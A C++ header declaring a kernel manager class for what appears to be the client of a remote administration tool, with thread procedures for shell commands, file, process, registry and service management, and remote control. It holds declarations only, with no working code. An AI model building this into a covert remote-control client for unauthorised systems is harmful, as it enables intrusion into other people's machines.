#pragma once
#include "Manager.h"
class CKernelManager :
	public CManager
{
public:
	CKernelManager(CIOCPClient* ClientObject);
	~CKernelManager();
	virtual void CKernelManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	
	VOID  ShutDown();

	HANDLE m_ThreadHandle[0x1000];
	int    m_ThreadHandleCount;
};

DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData);
DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData);
DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData);
DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData);
DWORD WINAPI FileManagerProcedure(LPVOID ParameterData);
DWORD WINAPI RemoteControllProcedure(LPVOID ParameterData);
DWORD WINAPI ServiceManagerProcedure(LPVOID ParameterData);
DWORD WINAPI RegisterManagerProcedure(LPVOID ParameterData);